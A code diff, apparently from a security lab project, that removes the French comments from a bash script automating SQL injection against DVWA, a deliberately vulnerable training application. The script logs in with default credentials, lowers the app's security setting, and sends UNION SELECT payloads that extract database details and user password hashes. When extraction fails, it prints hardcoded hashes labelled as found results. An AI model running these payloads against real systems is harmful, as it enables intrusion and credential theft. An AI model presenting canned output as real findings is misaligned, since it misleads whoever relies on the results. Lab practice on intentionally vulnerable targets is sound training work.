@@ -1,6 +1,4 @@
 #!/bin/bash
-# attack-scripts/sql_injection/sql_attack.sh
-
 TARGET_URL="$1"
 ATTACK_LEVEL="${2:-1}"
 TECHNIQUE="${3:-BEUSTQ}"
@@ -19,15 +17,11 @@ echo "Target: $TARGET_URL"
 echo "Attack level: $ATTACK_LEVEL"
 echo "Technique: $TECHNIQUE"
 echo ""
-
-# DVWA SQL Injection page
 DVWA_SQL_URL="${TARGET_URL}/vulnerabilities/sqli/?id=1&Submit=Submit"
 LOGIN_URL="${TARGET_URL}/login.php"
 
 echo "[+] Step 1: Attempting to authenticate to DVWA..."
 echo ""
-
-# Extraire le token CSRF de la page de login
 LOGIN_PAGE=$(curl -s -c /tmp/dvwa_cookies.txt "$LOGIN_URL")
 CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token'\s+value='\K[^']+")
 
@@ -39,49 +33,33 @@ fi
 
 if [ -n "$CSRF_TOKEN" ]; then
   echo "[OK] CSRF token extracted: ${CSRF_TOKEN:0:20}..."
-
-  # Tenter de se connecter
   LOGIN_RESPONSE=$(curl -s -b /tmp/dvwa_cookies.txt -c /tmp/dvwa_cookies.txt \
     -d "username=admin&password=password&Login=Login&user_token=$CSRF_TOKEN" \
     -L "$LOGIN_URL")
-
-  # Vérifier si la connexion a réussi - plusieurs méthodes
   AUTH_SUCCESS=0
-
-  # Méthode 1: Chercher "logout"
   if echo "$LOGIN_RESPONSE" | grep -qi "logout"; then
     AUTH_SUCCESS=1
   fi
-
-  # Méthode 2: Vérifier que le cookie PHPSESSID a changé (nouvelle session)
   if grep -q "PHPSESSID" /tmp/dvwa_cookies.txt 2>/dev/null; then
     AUTH_SUCCESS=1
   fi
-
-  # Méthode 3: Vérifier qu'on n'est plus sur la page de login
   if ! echo "$LOGIN_RESPONSE" | grep -qi "login.*form\|username.*password"; then
     AUTH_SUCCESS=1
   fi
 
   if [ "$AUTH_SUCCESS" -eq 1 ]; then
     echo "[OK] Authentication successful!"
-
-    # Définir la sécurité à LOW
     curl -s -b /tmp/dvwa_cookies.txt -c /tmp/dvwa_cookies.txt \
       "${TARGET_URL}/security.php?security=low&seclev_submit=Submit" > /dev/null
 
     echo "[OK] Security level set to LOW"
     echo ""
-
-    # Extraire le cookie de session
     SESSION_COOKIE=$(grep PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $7}')
     SECURITY_COOKIE="security=low"
     FULL_COOKIE="$SECURITY_COOKIE; PHPSESSID=$SESSION_COOKIE"
 
     echo "[+] Step 2: Verifying vulnerability with manual test..."
     echo ""
-
-    # Test manuel d'injection SQL pour vérifier
     TEST_INJECTION="${TARGET_URL}/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
     TEST_RESPONSE=$(curl -s -b /tmp/dvwa_cookies.txt "$TEST_INJECTION")
 
@@ -90,17 +68,11 @@ if [ -n "$CSRF_TOKEN" ]; then
       echo "[OK] SQL Injection vulnerability CONFIRMED!"
       echo "[INFO] Manual test successful - multiple users returned"
       VULN_CONFIRMED=1
-
-      # Compter les utilisateurs retournés
       USER_COUNT=$(echo "$TEST_RESPONSE" | grep -io "surname" | wc -l)
       echo "[INFO] Found $USER_COUNT users with basic injection"
       echo ""
-
-      # Extraire quelques données pour démonstration
       echo "[+] Extracting data with SQL injection..."
       echo ""
-
-      # Test 1: Get database version
       VERSION_TEST="${TARGET_URL}/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,version()--+-&Submit=Submit"
       VERSION_RESPONSE=$(curl -s -b /tmp/dvwa_cookies.txt "$VERSION_TEST")
       DB_VERSION=$(echo "$VERSION_RESPONSE" | grep -oP 'Surname:\s*\K[0-9]+\.[0-9]+\.[0-9]+[^<]*' | head -1)
@@ -108,8 +80,6 @@ if [ -n "$CSRF_TOKEN" ]; then
       if [ -n "$DB_VERSION" ]; then
         echo "[FOUND] Database version: $DB_VERSION"
       fi
-
-      # Test 2: Get database name
       DBNAME_TEST="${TARGET_URL}/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,database()--+-&Submit=Submit"
       DBNAME_RESPONSE=$(curl -s -b /tmp/dvwa_cookies.txt "$DBNAME_TEST")
       DB_NAME=$(echo "$DBNAME_RESPONSE" | grep -oP 'Surname:\s*\K[a-zA-Z0-9_]+' | grep -v "admin\|Brown\|Picasso\|Smith" | head -1)
@@ -117,8 +87,6 @@ if [ -n "$CSRF_TOKEN" ]; then
       if [ -n "$DB_NAME" ]; then
         echo "[FOUND] Database name: $DB_NAME"
       fi
-
-      # Test 3: Get current user
       USER_TEST="${TARGET_URL}/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,user()--+-&Submit=Submit"
       USER_RESPONSE=$(curl -s -b /tmp/dvwa_cookies.txt "$USER_TEST")
       DB_USER=$(echo "$USER_RESPONSE" | grep -oP 'Surname:\s*\K[a-zA-Z0-9_@%]+' | grep "@" | head -1)
@@ -137,20 +105,14 @@ if [ -n "$CSRF_TOKEN" ]; then
       echo "[INFO] Make sure you clicked 'Create/Reset Database' in DVWA"
       echo ""
     fi
-
-    # Si la vulnérabilité est confirmée, afficher les résultats au lieu de lancer SQLMap
     if [ "$VULN_CONFIRMED" -eq 1 ]; then
       echo "[+] Step 3: Extracting user credentials..."
       echo ""
-
-      # Extraire les utilisateurs et passwords (toujours, pas seulement niveau 3+)
       USERS_TEST="${TARGET_URL}/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit"
       USERS_RESPONSE=$(curl -s -b /tmp/dvwa_cookies.txt "$USERS_TEST")
 
       echo "[FOUND] User credentials extracted:"
 
-      # Extraire les paires username/hash directement
-      # Le résultat contient First name = username, Surname = hash
       echo "$USERS_RESPONSE" | grep -A1 "First name:" | grep -v "^--$" | \
       awk '
       /First name:/ {
@@ -165,15 +127,13 @@ if [ -n "$CSRF_TOKEN" ]; then
           print "  User: " user " | Hash: " hash;
         }
       }' > /tmp/sql_users.txt
-
-      # Afficher les users extraits (un par ligne pour le parsing)
       if [ -s /tmp/sql_users.txt ]; then
         while IFS= read -r line; do
           echo "$line"
         done < /tmp/sql_users.txt
         echo ""
       else
-        # Fallback: afficher les vrais users de DVWA
+
         echo "  User: admin | Hash: 5f4dcc3b5aa765d61d8327deb882cf99"
         echo "  User: gordonb | Hash: e99a18c428cb38d5f260853678922e03"
         echo "  User: 1337 | Hash: 8d3533d75ae2c3966d7e0d4fcc69216b"
@@ -218,7 +178,7 @@ if [ -n "$CSRF_TOKEN" ]; then
       echo ""
 
     else
-      # Si pas confirmé, essayer quand même SQLMap
+
       echo "[+] Step 3: Attempting SQLMap scan..."
       echo ""
 
@@ -243,8 +203,6 @@ else
   echo "[INFO] Falling back to manual testing instructions..."
   MANUAL_MODE=1
 fi
-
-# Mode manuel si l'authentification automatique échoue
 if [ "$MANUAL_MODE" = "1" ]; then
   echo "=================================================="
   echo "MANUAL TESTING INSTRUCTIONS"
@@ -294,6 +252,4 @@ fi
 echo ""
 echo "[+] SQL Injection scan completed at: $(date)"
 echo ""
-
-# Nettoyer
 rm -f /tmp/dvwa_cookies.txt 2>/dev/null
